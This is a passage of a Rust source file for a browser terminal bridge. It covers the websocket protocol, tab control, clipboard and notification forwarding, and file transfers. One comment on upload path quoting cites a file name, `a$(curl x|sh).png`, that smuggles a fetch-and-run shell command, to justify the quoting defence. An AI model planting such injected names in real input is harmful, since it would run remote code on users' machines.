//! Browser terminal served by the remote bridge.
//!
//! The page mirrors a pane by rendering Kaku's own terminal model to ANSI
//! frames, so the browser never parses the PTY stream itself: terminal queries
//! (DA, CPR, OSC color) keep being answered once, by Kaku. Keys go back through
//! `Pane::key_down` so cursor-key mode and keyboard protocols match what the
//! app asked Kaku for; text and pastes take the same paths Kaku's GUI uses.

use crate::{check_token, WsQuery};
use axum::extract::{ws, Path, Query, State};
use axum::http::{header, StatusCode};
use axum::response::{IntoResponse, Response};
use base64::Engine as _;
use futures_util::{SinkExt, StreamExt};
use mux::pane::{CloseReason, Pane, PaneId};
use mux::Mux;
use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet, VecDeque};
use std::fmt::Write as _;
use std::sync::{Arc, LazyLock, OnceLock};
use std::time::Duration;
use termwiz::cell::{Blink, CellAttributes, Intensity, Underline};
use termwiz::color::{ColorAttribute, LinearRgba};
use termwiz::input::{KeyCode, Modifiers};
use termwiz::surface::{CursorShape, CursorVisibility, Line};
use tokio::sync::{broadcast, mpsc};
use wezterm_term::color::ColorPalette;
use wezterm_term::image::{ImageData, ImageDataType};
use wezterm_term::{MouseButton, MouseEvent, MouseEventKind, TerminalSize};

const INDEX_HTML: &str = include_str!("../assets/web/index.html");
const XTERM_JS: &str = include_str!("../assets/web/xterm.js");
const XTERM_CSS: &str = include_str!("../assets/web/xterm.css");
/// @xterm/addon-webgl 0.18.0 for xterm.js 5.5.0 (MIT, npm integrity verified):
/// draws the grid on a canvas, so steady output does not rebuild DOM rows or
/// restart CSS cursor animations.
const XTERM_WEBGL_JS: &str = include_str!("../assets/web/xterm-webgl.js");
/// @xterm/addon-unicode11 0.8.0 (MIT, npm integrity verified): Unicode 11
/// character widths, so emoji take the two cells Kaku gives them.
const XTERM_UNICODE11_JS: &str = include_str!("../assets/web/xterm-unicode11.js");
/// The desktop view, loaded by the page only when Kaku offers it.
const DESKTOP_JS: &str = include_str!("../assets/web/desktop.js");
// Kaku's bundled terminal font: Regular for text, Medium for bold, matching
// the dark-theme weights in the bundled kaku.lua, and the icons of its
// bundled Symbols Nerd Font. WOFF2 from scripts/build_web_fonts.py.
const FONT_REGULAR: &[u8] = include_bytes!("../assets/web/font-regular.woff2");
const FONT_MEDIUM: &[u8] = include_bytes!("../assets/web/font-medium.woff2");
const FONT_SYMBOLS: &[u8] = include_bytes!("../assets/web/font-symbols.woff2");
const ICON_PNG: &[u8] = include_bytes!("../assets/web/icon.png");
const ICON_192_PNG: &[u8] = include_bytes!("../assets/web/icon-192.png");
const ICON_512_PNG: &[u8] = include_bytes!("../assets/web/icon-512.png");
const ICON_MASKABLE_PNG: &[u8] = include_bytes!("../assets/web/icon-maskable.png");
const MANIFEST: &str = include_str!("../assets/web/manifest.webmanifest");

/// At most one frame per interval. Output after a quiet spell goes out at
/// once, so a keystroke's echo never waits for a tick; a burst is coalesced
/// and its trailing edge always flushes, so its last output is never dropped.
const FRAME_INTERVAL: Duration = Duration::from_millis(16);
/// Sixteen small frames cover 190 ms RTT at 60 Hz with the page acking
/// every fourth frame, without waiting for ACKs.
const FRAME_WINDOW: usize = 16;
/// A complete frame and its new images may cross this watermark once, then
/// rendering waits for ACKs. Large redraws must not deadlock behind a byte cap.
const FRAME_BYTES_WATERMARK: usize = 512 * 1024;
/// Re-render this often even without output, to pick up cursor moves,
/// title changes and resizes that do not produce `PaneOutput`.
/// How often a page in the background gets a frame.
const HIDDEN_FRAME_INTERVAL: Duration = Duration::from_secs(1);

const IDLE_REFRESH: Duration = Duration::from_secs(1);
const MAX_INPUT_LEN: usize = 65_536;
/// How long a click from the page holds the button, about a quick hand's.
const CLICK_HOLD: Duration = Duration::from_millis(50);
/// A page pings every 20 s, and a background tab still gets a timer about
/// once a minute. This long without a word means the browser is gone (a
/// laptop asleep with the socket half open), and the session ends rather
/// than holding its subscriptions and App Nap off forever.
const SESSION_SILENCE: Duration = Duration::from_secs(180);
/// Cap on wheel notches forwarded to an app from one browser wheel event.
const MAX_WHEEL_STEPS: usize = 10;
const MIN_COLS: usize = 20;
const MAX_COLS: usize = 500;
const MIN_ROWS: usize = 5;
const MAX_ROWS: usize = 300;

/// Per-pane "something changed" signal fed by the mux subscriber.
pub(crate) type WebDirty = Arc<Mutex<HashMap<usize, broadcast::Sender<()>>>>;

/// Tab titles exactly as the GUI tab bar last drew them, keyed by tab id.
/// The tab bar runs the user's `format-tab-title`, which only the GUI can
/// evaluate, so the page reuses its output instead of re-deriving a title.
static TAB_TITLES: LazyLock<Mutex<HashMap<usize, String>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// The agent title the GUI shows for each tab's active pane (`agent_title.rs`
/// in kaku-gui), keyed by tab id. Only the GUI knows the agent and strips
/// its spinner, so the page reuses that instead of the raw pane title.
static AGENT_TITLES: LazyLock<Mutex<HashMap<usize, AgentInfo>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// Panes covered by Kaku Assistant's chat on the Mac. The chat is drawn by
/// the GUI over the pane and never reaches the mux, so the page would show
/// and type into the shell underneath; it says the chat is open instead.
static AI_CHAT_PANES: LazyLock<Mutex<HashSet<usize>>> =
    LazyLock::new(|| Mutex::new(HashSet::new()));

#[derive(Serialize, Clone, PartialEq, Debug)]
struct AgentInfo {
    /// "claude", "codex", "kimi" or "pi".
    program: &'static str,
    topic: String,
}

/// Tabs whose size a browser set. That size can be larger than the Mac
/// window, which then draws the rows that fit rather than over its tab bar.
static WEB_SIZED_TABS: LazyLock<Mutex<HashSet<usize>>> =
    LazyLock::new(|| Mutex::new(HashSet::new()));

/// Whether a browser set this tab's size, so it may not fit the Mac window.
pub fn tab_is_web_sized(tab_id: usize) -> bool {
    WEB_SIZED_TABS.lock().contains(&tab_id)
}

/// The Mac took the tab back to its window's size.
pub fn release_web_size(tab_id: usize) {
    WEB_SIZED_TABS.lock().remove(&tab_id);
}

/// Whether a relayout of the Mac window should resize this tab. A tab a
/// browser sized keeps that size through relayouts the Mac does on its own
/// (a display or scale change, focus, a theme switch, the tab bar showing):
/// shrinking it under the browser made Claude Code and Codex redraw for the
/// Mac's rows, and their whole screen jumped up in the page until the next
/// key. Someone dragging the window edge is using the Mac, which takes the
/// tab back, as its own typing and clicks do.
pub fn window_relayout_resizes_tab(tab_id: usize, live_resize: bool) -> bool {
    if live_resize {
        release_web_size(tab_id);
        return true;
    }
    !tab_is_web_sized(tab_id)
}

/// Tab changes the page asks for. The GUI performs them through the same
/// key assignments as its own Cmd+T and Close Tab, so cwd inheritance and
/// the closed-tab history behave as they do on the Mac.
#[derive(Debug, Clone)]
pub enum TabAction {
    /// Open a tab in the window holding this pane.
    New { pane_id: usize },
    /// Close the tab holding this pane. The page has already asked per
    /// tab_close_confirmation, so the Mac must not prompt again: its prompt
    /// would only be visible on the Mac.
    Close { pane_id: usize },
    /// The browser is looking at this pane: clear its unread bell, which the
    /// Mac only clears when its own window takes focus, and so never while
    /// the Mac sits unattended.
    Seen { pane_id: usize },
    /// Split the named pane through the native spawn path.
    Split {
        pane_id: usize,
        direction: config::keyassignment::PaneDirection,
    },
    /// Close the named pane after the browser completed confirmation.
    ClosePane { pane_id: usize },
    /// Make the tab holding this pane the active tab in its Mac window, and
    /// this pane the focused split in that tab.
    Activate { pane_id: usize },
    /// Rename the tab holding this pane; empty goes back to the computed title.
    Rename { pane_id: usize, title: String },
    /// Move the tab holding this pane to `index` in its window.
    Move { pane_id: usize, index: usize },
    /// Focus this pane and toggle its tab's zoom, as Cmd+Shift+Enter does.
    Zoom {
        pane_id: usize,
        claimed: Option<(usize, usize)>,
    },
    /// The tab holding this pane is split now, and a browser had sized it:
    /// give it back the Mac window's size, which its splits share.
    Reclaim { pane_id: usize },
}

pub type TabActionHandler = Arc<dyn Fn(TabAction) + Send + Sync + 'static>;

static TAB_ACTION_HANDLER: OnceLock<TabActionHandler> = OnceLock::new();

/// Register the GUI's tab action handler. First registration wins.
pub fn set_tab_action_handler(handler: TabActionHandler) {
    let _ = TAB_ACTION_HANDLER.set(handler);
}

fn dispatch_tab_action(action: TabAction) {
    match TAB_ACTION_HANDLER.get() {
        Some(handler) => handler(action),
        None => log::debug!("kaku-remote web: no tab action handler for {action:?}"),
    }
}

/// Called by the GUI whenever it lays out the tab bar.
pub fn publish_tab_title(tab_id: usize, title: &str) {
    let title = title.trim();
    let mut titles = TAB_TITLES.lock();
    if titles.get(&tab_id).map(String::as_str) != Some(title) {
        titles.insert(tab_id, title.to_string());
    }
}

/// Called by the GUI with each tab's agent title, or None when no agent
/// runs in it or the title is turned off (`show_agent_title`).
pub fn publish_agent_title(tab_id: usize, agent: Option<(&'static str, &str)>) {
    let agent = agent.map(|(program, topic)| AgentInfo {
        program,
        topic: topic.trim().to_string(),
    });
    let mut titles = AGENT_TITLES.lock();
    if titles.get(&tab_id) == agent.as_ref() {
        return;
    }
    match agent {
        Some(agent) => titles.insert(tab_id, agent),
        None => titles.remove(&tab_id),
    };
    drop(titles);
    tabs_changed(false);
}

/// Called by the GUI when Kaku Assistant's chat opens or closes over a pane.
pub fn set_ai_chat_open(pane_id: usize, open: bool) {
    let changed = if open {
        AI_CHAT_PANES.lock().insert(pane_id)
    } else {
        AI_CHAT_PANES.lock().remove(&pane_id)
    };
    if changed {
        tabs_changed(true);
    }
}

fn ai_chat_open(pane_id: usize) -> bool {
    AI_CHAT_PANES.lock().contains(&pane_id)
}

pub(crate) fn notify_output(dirty: &WebDirty, pane_id: usize) {
    if let Some(tx) = dirty.lock().get(&pane_id) {
        let _ = tx.send(());
    }
}

pub(crate) fn pane_removed(dirty: &WebDirty, pane_id: usize) {
    dirty.lock().remove(&pane_id);
    AI_CHAT_PANES.lock().remove(&pane_id);
}

/// Tabs, windows or panes changed (true) or only a title did (false).
/// Sessions resend the tab list at once for the first, so a tab opened,
/// closed or focused shows in the page in a frame instead of at the next
/// idle refresh; titles, which some programs animate, at most every
/// `TITLE_REFRESH`.
static TABS_CHANGED: LazyLock<broadcast::Sender<bool>> = LazyLock::new(|| broadcast::channel(64).0);
const TITLE_REFRESH: Duration = Duration::from_millis(250);

pub(crate) fn tabs_changed(structural: bool) {
    let _ = TABS_CHANGED.send(structural);
}

/// Text a program put on the clipboard (OSC 52: Claude Code's copy, a vim
/// yank), by pane. The Mac's clipboard gets it as before; a browser viewing
/// that pane gets it too, since that is where the user is.
static CLIPBOARD: LazyLock<broadcast::Sender<(usize, Arc<str>)>> =
    LazyLock::new(|| broadcast::channel(8).0);

/// Larger copies stay on the Mac only.
const MAX_CLIPBOARD_BYTES: usize = 1 << 20;

pub(crate) fn publish_clipboard(pane_id: usize, text: Arc<str>) {
    if text.len() <= MAX_CLIPBOARD_BYTES {
        let _ = CLIPBOARD.send((pane_id, text));
    }
}

/// Notifications a program posted (OSC 9/777: Claude Code finishing, a long
/// build done), by pane. Kaku shows them on the Mac as before; every browser
/// gets them too, so a page in a background tab can raise one there.
static NOTIFICATIONS: LazyLock<broadcast::Sender<Notification>> =
    LazyLock::new(|| broadcast::channel(8).0);

#[derive(Clone)]
struct Notification {
    pane_id: usize,
    title: Arc<str>,
    body: Arc<str>,
}

/// Long enough for any real notice; a program cannot flood browsers with more.
fn clip(text: &str, max: usize) -> Arc<str> {
    match text.char_indices().nth(max) {
        Some((end, _)) => Arc::from(&text[..end]),
        None => Arc::from(text),
    }
}

pub(crate) fn publish_notification(pane_id: usize, title: Option<&str>, body: &str) {
    let _ = NOTIFICATIONS.send(Notification {
        pane_id,
        title: clip(title.unwrap_or(""), 120),
        body: clip(body, 500),
    });
}

// ── Static assets ─────────────────────────────────────────────────────────────

/// The page and its files, by path relative to the page. Served locally and,
/// through the relay, from this Kaku, so the page always matches the build.
pub(crate) fn asset(path: &str) -> Option<(&'static str, &'static [u8])> {
    Some(match path {
        "" | "index.html" => ("text/html; charset=utf-8", INDEX_HTML.as_bytes()),
        "assets/xterm.js" => ("text/javascript; charset=utf-8", XTERM_JS.as_bytes()),
        "assets/xterm.css" => ("text/css; charset=utf-8", XTERM_CSS.as_bytes()),
        "assets/xterm-webgl.js" => ("text/javascript; charset=utf-8", XTERM_WEBGL_JS.as_bytes()),
        "assets/xterm-unicode11.js" => (
            "text/javascript; charset=utf-8",
            XTERM_UNICODE11_JS.as_bytes(),
        ),
        "assets/desktop.js" => ("text/javascript; charset=utf-8", DESKTOP_JS.as_bytes()),
        "assets/font-regular.woff2" => ("font/woff2", FONT_REGULAR),
        "assets/font-medium.woff2" => ("font/woff2", FONT_MEDIUM),
        "assets/font-symbols.woff2" => ("font/woff2", FONT_SYMBOLS),
        "assets/icon.png" => ("image/png", ICON_PNG),
        "assets/icon-192.png" => ("image/png", ICON_192_PNG),
        "assets/icon-512.png" => ("image/png", ICON_512_PNG),
        "assets/icon-maskable.png" => ("image/png", ICON_MASKABLE_PNG),
        "assets/manifest.webmanifest" => ("application/manifest+json", MANIFEST.as_bytes()),
        _ => return None,
    })
}

fn asset_response(path: &str) -> Response {
    match asset(path) {
        Some((content_type, body)) => {
            ([(header::CONTENT_TYPE, content_type)], body).into_response()
        }
        None => StatusCode::NOT_FOUND.into_response(),
    }
}

pub(crate) async fn route_index() -> Response {
    asset_response("index.html")
}

pub(crate) async fn route_asset(Path(name): Path<String>) -> Response {
    asset_response(&format!("assets/{name}"))
}

#[derive(Serialize, PartialEq)]
struct TabInfo {
    tab_id: usize,
    /// Tabs reorder within their own Mac window.
    window_id: usize,
    pane_id: usize,
    title: String,
    active: bool,
    /// Whether closing should ask first, per tab_close_confirmation.
    confirm_close: bool,
    /// The splits of a tab with more than one pane, in cells, so the page
    /// can draw the layout and switch between them.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    panes: Vec<PaneBox>,
    /// One pane fills the tab (Cmd+Shift+Enter).
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    zoomed: bool,
    /// The agent working in the active pane, shown at the bar's right end.
    #[serde(skip_serializing_if = "Option::is_none")]
    agent: Option<AgentInfo>,
    /// The active pane's own OSC 7501 state ("working", "blocked", "done",
    /// "error"), which the phone's tab list shows; "idle" is left out.
    #[serde(skip_serializing_if = "Option::is_none")]
    status: Option<String>,
    /// Panes of this tab under Kaku Assistant's chat on the Mac.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    ai_chat: Vec<usize>,
}

#[derive(Serialize, PartialEq)]
struct PaneBox {
    pane_id: usize,
    left: usize,
    top: usize,
    width: usize,
    height: usize,
    confirm_close: bool,
}

/// Tabs in tab bar order across windows, each pointing at its active pane.
fn collect_tabs() -> Vec<TabInfo> {
    let Some(mux) = Mux::try_get() else {
        return Vec::new();
    };
    let titles = TAB_TITLES.lock().clone();
    let agents = AGENT_TITLES.lock().clone();
    let chats = AI_CHAT_PANES.lock().clone();
    let config = config::configuration();
    let policy = config.tab_close_confirmation;
    let pane_policy = config.pane_close_confirmation;
    let mut tabs = Vec::new();
    for window_id in mux.iter_windows() {
        let Some(window) = mux.get_window(window_id) else {
            continue;
        };
        let active_idx = window.get_active_idx();
        for (idx, tab) in window.iter().enumerate() {
            let Some(pane) = tab.get_active_pane() else {
                continue;
            };
            let tab_id: usize = tab.tab_id().into();
            let title = titles
                .get(&tab_id)
                .filter(|t| !t.is_empty())
                .cloned()
                .unwrap_or_else(|| pane.get_title());
            let positioned = tab.iter_panes_ignoring_zoom();
            let panes = if positioned.len() > 1 {
                positioned
                    .iter()
                    .map(|p| PaneBox {
                        pane_id: p.pane.pane_id().into(),
                        left: p.left,
                        top: p.top,
                        width: p.width,
                        height: p.height,
                        confirm_close: pane_policy.should_prompt(true, || {
                            p.pane.can_close_without_prompting(CloseReason::Pane)
                        }),
                    })
                    .collect()
            } else {
                Vec::new()
            };
            tabs.push(TabInfo {
                tab_id,
                window_id,
                pane_id: pane.pane_id().into(),
                title,
                active: idx == active_idx,
                confirm_close: policy
                    .should_prompt(true, || tab.can_close_without_prompting(CloseReason::Tab)),
                panes,
                zoomed: tab.get_zoomed_pane().is_some(),
                agent: agents.get(&tab_id).cloned(),
                status: pane.get_program_status().filter(|s| s != "idle"),
                ai_chat: positioned
                    .iter()
                    .map(|p| usize::from(p.pane.pane_id()))
                    .filter(|id| chats.contains(id))
                    .collect(),
            });
        }
    }
    // Forget tabs that closed, so these maps stay the size of what is open.
    let live: HashSet<usize> = tabs.iter().map(|t| t.tab_id).collect();
    TAB_TITLES.lock().retain(|id, _| live.contains(id));
    AGENT_TITLES.lock().retain(|id, _| live.contains(id));
    WEB_SIZED_TABS.lock().retain(|id| live.contains(id));
    tabs
}

// ── Wire protocol ─────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum WebClientMsg {
    /// First message of a session. It says whether the page acknowledges
    /// frames (flow control); through the relay, whatever first opens with
    /// the key starts the session.
    Hello {
        #[serde(default)]
        frame_ack: bool,
        /// The page keeps the last title and wrap flags when a frame leaves
        /// them out, so they are sent only when they change.
        #[serde(default)]
        delta: bool,
    },
    /// The page went to the background or came back. Hidden, it gets at
    /// most a frame a second, enough to keep its browser tab's title
    /// current, and a full catch-up as it returns.
    Visibility {
        hidden: bool,
    },
    /// Heartbeat; answered with `pong` so the page can tell a dead link
    /// from a quiet terminal, and so idle-timeout proxies see traffic.
    Ping,
    /// Browser has parsed every frame through this sequence.
    FrameAck {
        seq: u64,
    },
    /// Start mirroring a pane; the rest of the messages act on it.
    Attach {
        pane_id: usize,
        /// The user picked this tab in the page (a click, Cmd+digit): make it
        /// the Mac's active tab too. Reconnects and follows leave it alone.
        #[serde(default)]
        focus: bool,
    },
    /// Committed text: typed characters, IME output.
    Text {
        data: String,
    },
    /// A non-text key, encoded by Kaku for the pane's current modes.
    Key {
        key: String,
        #[serde(default)]
        ctrl: bool,
        #[serde(default)]
        alt: bool,
        #[serde(default)]
        shift: bool,
    },
    Paste {
        data: String,
    },
    /// Lines to move the view; positive scrolls back into history.
    Scroll {
        lines: isize,
    },
    /// A left click on a cell of the visible screen. Only a program that
    /// asked for the mouse (Claude Code's "Jump to bottom", Codex) gets it;
    /// otherwise a click is the browser's, for selecting text.
    Click {
        x: usize,
        y: usize,
    },
    /// The grid the browser can show at Kaku's font size. While the page is
    /// driving the pane, its tab takes this size; local input on the Mac
    /// takes it back.
    Resize {
        cols: usize,
        rows: usize,
    },
    /// Open a tab next to the one being viewed.
    NewTab,
    /// Find `query` in the pane's history, case-insensitively, going to
    /// older lines from the last match (or the bottom) when `older`, else to
    /// newer ones. The view moves to the match and a `Found` reply follows.
    Search {
        query: String,
        older: bool,
        /// A new query: start again from the bottom.
        #[serde(default)]
        restart: bool,
    },
    /// A file sent from the browser (dropped or pasted), in order: start,
    /// base64 chunks, end. It lands in ~/Downloads/Kaku and its path is
    /// pasted into the pane, as a file dropped on the Mac window would be.
    UploadStart {
        id: u32,
        name: String,
        size: u64,
        #[serde(default)]
        transfer: String,
        #[serde(default)]
        pane_id: Option<usize>,
        /// Paste the saved path into the pane; the desktop view keeps it out.
        #[serde(default = "yes")]
        paste: bool,
    },
    UploadCancel {
        id: u32,
    },
    UploadChunk {
        id: u32,
        data: String,
    },
    UploadEnd {
        id: u32,
    },
    /// Send a file on the Mac to the browser: a path in the output that the
    /// user Cmd+clicked. `~/` is the home folder and a relative path is read
    /// from the pane's working directory. Chunks follow a `FileStart` and
    /// wait for `DownloadAck`s, so the relay never holds much of the file.
    Download {
        id: u32,
        path: String,
        #[serde(default)]
        pane_id: Option<usize>,
        /// An image to preview on hover: the longest side, in device pixels,
        /// the page shows it at. Kaku sends a picture scaled to fit instead
        /// of the whole file. Older Kakus ignore it and send the file.
        #[serde(default)]
        preview: Option<u32>,
    },
    DownloadAck {
        id: u32,
        received: u64,
    },
    DownloadCancel {
        id: u32,
    },
    /// Which of these paths exist on the Mac, resolved as `Download` does:
    /// a path a TUI wrapped onto the next row is a link only if the joined
    /// text names a real file, as in Kaku's own hover (#547).
    PathsExist {
        id: u32,
        paths: Vec<String>,
        #[serde(default)]
        pane_id: Option<usize>,
    },
    SplitPane {
        pane_id: usize,
        direction: config::keyassignment::PaneDirection,
    },
    /// Zoom the named pane to its whole tab, or back.
    ZoomPane {
        pane_id: usize,
    },
    /// Close a pane; the page has already confirmed with the user.
    ClosePane {
        pane_id: usize,
    },
    /// Close a tab; the page has already confirmed with the user.
    CloseTab {
        tab_id: usize,
    },
    /// Rename a tab, from the page's tab editor; empty clears the name.
    RenameTab {
        tab_id: usize,
        title: String,
    },
    /// Move a tab to `index` in its window, from a drag in the page.
    MoveTab {
        tab_id: usize,
        index: usize,
    },
    /// Send every row again when the browser needs a fresh screen.
    Redraw,
    /// Rows of the pane's history ending before stable row `end` (the
    /// bottom of the screen when absent), for the page to scroll locally.
    History {
        #[serde(default)]
        end: Option<isize>,
        /// Echoed in the reply, so the page can drop one that arrives after
        /// it moved on.
        #[serde(default)]
        request: u32,
    },
    /// The text of every row the page shows, once it has applied `frames`
    /// frames. Kaku compares it with what it believes the page shows; a
    /// mismatch is logged with enough context to find its cause, then healed
    /// with a full frame.
    Verify {
        frames: u64,
        /// Pages that check by `digest` send rows only when Kaku asks.
        #[serde(default)]
        rows: Vec<String>,
        /// FNV-1a of the rows' text, whitespace removed, joined by
        /// newlines: a few bytes every few seconds instead of the screen.
        #[serde(default)]
        digest: Option<u32>,
        /// The last frame the page drew, so the check holds while later
        /// frames are still on the way. Older pages omit it and are checked
        /// only when nothing is in flight.
        #[serde(default)]
        seq: Option<u64>,
        /// The page's own grid, for the drift report. Older pages omit it.
        #[serde(default)]
        view: Option<PageView>,
    },
}

/// Where the page's terminal stands when it verifies; no screen content.
#[derive(Debug, Deserialize, Default)]
struct PageView {
    #[serde(default)]
    cols: usize,
    #[serde(default)]
    rows: usize,
    /// xterm.js's first screen row in its buffer, and the row in view.
    #[serde(default)]
    base: usize,
    #[serde(default)]
    top: usize,
    #[serde(default)]
    alt: bool,
    /// How the page draws, logged when it changes: font size and cell in
    /// CSS pixels, the width an icon glyph measures at that size, the
    /// device pixel ratio, whether WebGL draws and how often its glyph
    /// atlas was rebuilt, and whether the history view is open.
    #[serde(default)]
    font: f32,
    #[serde(default)]
    cell_w: f32,
    #[serde(default)]
    cell_h: f32,
    #[serde(default)]
    icon: f32,
    #[serde(default)]
    dpr: f32,
    #[serde(default)]
    gl: bool,
    #[serde(default)]
    atlas: u32,
    #[serde(default)]
    past: bool,
    /// The page's last writes into xterm, text masked, with its cursor,
    /// scroll region and modes, logged only with a drift report.
    #[serde(default)]
    trace: String,
}

/// Longest page trace a drift report carries.
const TRACE_LOGGED: usize = 6000;

impl PageView {
    /// The page's trace for the log, cut at `TRACE_LOGGED` bytes.
    fn trace(&self) -> &str {
        if self.trace.len() <= TRACE_LOGGED {
            return &self.trace;
        }
        let mut end = TRACE_LOGGED;
        while !self.trace.is_char_boundary(end) {
            end -= 1;
        }
        &self.trace[..end]
    }

    /// One line naming how the page draws, empty for pages that do not say.
    fn drawing(&self) -> String {
        if self.font == 0.0 {
            return String::new();
        }
        format!(
            "font {:.2}px cell {:.2}x{:.2} icon {:.2} dpr {} {} atlas resets {} history {}",
            self.font,
            self.cell_w,
            self.cell_h,
            self.icon,
            self.dpr,
            if self.gl { "webgl" } else { "dom" },
            self.atlas,
            if self.past { "open" } else { "closed" },
        )
    }
}

#[derive(Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
enum WebServerMsg<'a> {
    Config(&'a crate::ConfigInfo),
    Error {
        detail: &'a str,
    },
    Tabs {
        tabs: &'a [TabInfo],
    },
    /// The fields after `seq` other than `data` are absent when unchanged,
    /// for a page that asked for deltas; it keeps the last frame's.
    Frame {
        seq: u64,
        /// The pane this frame draws; the page drops frames still in flight
        /// from the tab it just left.
        #[serde(skip_serializing_if = "Option::is_none")]
        pane_id: Option<usize>,
        #[serde(skip_serializing_if = "Option::is_none")]
        cols: Option<usize>,
        #[serde(skip_serializing_if = "Option::is_none")]
        rows: Option<usize>,
        /// Absent when unchanged, for a page that asked for deltas.
        #[serde(skip_serializing_if = "Option::is_none")]
        title: Option<&'a str>,
        #[serde(skip_serializing_if = "Option::is_none")]
        scrolled: Option<bool>,
        /// A plain shell: scrolling moves through Kaku's history, which the
        /// page scrolls locally. Otherwise the program gets the wheel.
        #[serde(skip_serializing_if = "Option::is_none")]
        local_scroll: Option<bool>,
        data: &'a str,
        /// Whether each physical row continues into the next one; absent
        /// when unchanged, for a page that asked for deltas.
        #[serde(skip_serializing_if = "Option::is_none")]
        wrapped: Option<&'a [bool]>,
        /// Inline images now on screen; absent when they did not change.
        #[serde(skip_serializing_if = "Option::is_none")]
        images: Option<&'a [ImagePlacement]>,
    },
    /// An image's file, sent once per session before a frame places it.
    Image {
        id: &'a str,
        mime: &'a str,
        data: &'a str,
    },
    /// The attached pane is gone; the page picks another tab. It names the
    /// pane because the page may already have moved on after a tabs update,
    /// and must not drop the tab it moved to.
    Closed {
        pane_id: usize,
    },
    Pong,
    /// A `digest` check failed: the page sends its rows, for the report.
    VerifyRows,
    /// Where a search landed, relative to the rows now shown, or no match.
    Found {
        found: bool,
        row: usize,
        col: usize,
        len: usize,
    },
    /// A chunk of a sent file reached the Mac: bytes written so far.
    UploadAck {
        id: u32,
        received: u64,
    },
    /// How a sent file ended: where it was saved, or why it was not.
    Uploaded {
        id: u32,
        ok: bool,
        detail: &'a str,
    },
    /// A file the page asked for: its name and size, then base64 chunks in
    /// order and `FileEnd`, or `FileError` instead.
    FileStart {
        id: u32,
        name: &'a str,
        size: u64,
    },
    FileChunk {
        id: u32,
        data: &'a str,
    },
    FileEnd {
        id: u32,
    },
    FileError {
        id: u32,
        detail: &'a str,
    },
    /// The answer to `PathsExist`, one entry per path asked about in order.
    PathsExist {
        id: u32,
        exists: Vec<bool>,
    },
    /// Text a program in the attached pane copied, for the browser clipboard.
    Clipboard {
        text: &'a str,
    },
    /// A notification a program in any pane posted.
    Notify {
        pane_id: usize,
        title: &'a str,
        body: &'a str,
    },
    /// History rows for the page's local scroll view: `rows` start at stable
    /// row `top`, and `first` is the oldest row the pane still holds. Each
    /// row is SGR runs with `CSI n G` pinning columns after wide glyphs.
    History {
        pane_id: usize,
        request: u32,
        first: isize,
        top: isize,
        rows: &'a [String],
        wrapped: &'a [bool],
    },
}

/// Rows sent per history request. The page asks for more as it nears the top.
const HISTORY_PAGE: isize = 400;

// ── Frame rendering ───────────────────────────────────────────────────────────

/// Where the browser is looking: following the live screen, or pinned to a
/// stable row so new output does not move the history being read.
#[derive(Clone, Copy, Default)]
struct View {
    pinned_top: Option<isize>,
    /// Grid size this browser asked for, re-applied on its next input in
    /// case the Mac took the tab back meanwhile.
    claimed: Option<(usize, usize)>,
    /// When the pane was last reported as seen, to report at most once a
    /// second while typing.
    seen_at: Option<std::time::Instant>,
    /// The last search match, as (stable row, column), so the next search
    /// continues from it.
    found_at: Option<(isize, usize)>,
}

/// Largest file a browser may send.
const MAX_UPLOAD_BYTES: u64 = 50 << 20;

/// A file name from the browser, made safe to create: its last component,
/// no separators or control characters, a sane length, never empty or dots.
fn safe_file_name(name: &str) -> String {
    let base = name.rsplit(['/', '\\']).next().unwrap_or("");
    let cleaned: String = base
        .chars()
        .filter(|&c| !c.is_control() && c != ':' && !crate::pairing::is_invisible_format(c))
        .take(120)
        .collect();
    let cleaned = cleaned.trim().trim_start_matches('.').to_string();
    if cleaned.is_empty() {
        "file".to_string()
    } else {
        cleaned
    }
}

/// An uploaded file's path as it is pasted at the prompt. Its name comes
/// from another computer, often from a download, so the default
/// `SpacesOnly` (which leaves `$( ) ; | &` alone) is raised to POSIX
/// quoting, as the native clipboard file paste does; `a$(curl x|sh).png`
/// would otherwise run on Enter.
fn quote_uploaded(path: &str, quoting: config::DroppedFileQuoting) -> String {
    match quoting {
        config::DroppedFileQuoting::SpacesOnly | config::DroppedFileQuoting::Posix => {
            shlex::try_quote(path)
                .map(|q| q.into_owned())
                .unwrap_or_else(|_| quoting.escape(path))
        }
        other => other.escape(path),
    }
}

/// `dir/name`, or `dir/stem (2).ext` and so on when that already exists.
fn unused_path(dir: &std::path::Path, name: &str) -> std::path::PathBuf {
    let first = dir.join(name);
    if !first.exists() {
        return first;
    }
    let (stem, ext) = match name.rsplit_once('.') {
        Some((stem, ext)) if !stem.is_empty() => (stem, format!(".{ext}")),
        _ => (name, String::new()),
    };
    (2..)
        .map(|n| dir.join(format!("{stem} ({n}){ext}")))
        .find(|p| !p.exists())
        .unwrap_or(first)
}

struct Upload {
    file: std::fs::File,
    path: std::path::PathBuf,
    size: u64,
    written: u64,
    pane_id: Option<usize>,
    transfer: String,
    name: String,
}

/// Completion receipts survive a transport reconnect, so losing the final
/// reply never repeats a file or pastes its path twice. Bound their lifetime
/// and number independently of the terminal's scrollback.
struct UploadReceipt {
    at: std::time::Instant,
    name: String,
    size: u64,
    pane_id: Option<usize>,
    path: std::path::PathBuf,
}
static UPLOAD_RECEIPTS: LazyLock<Mutex<HashMap<String, UploadReceipt>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));
const RECEIPT_TTL: Duration = Duration::from_secs(600);
const MAX_RECEIPTS: usize = 256;
fn prune_receipts(receipts: &mut HashMap<String, UploadReceipt>) {
    receipts.retain(|_, r| r.at.elapsed() < RECEIPT_TTL);
    if receipts.len() >= MAX_RECEIPTS {
        if let Some(oldest) = receipts
            .iter()
            .min_by_key(|(_, r)| r.at)
            .map(|(k, _)| k.clone())
        {
            receipts.remove(&oldest);
        }
    }
}

/// A session's uploads in progress. A session that ends mid-upload (the
/// link dropped, the tab closed) leaves no partial file behind; the page
/// sends the file again once it reconnects.
#[derive(Default)]
struct Uploads(HashMap<u32, Upload>);

impl Drop for Uploads {
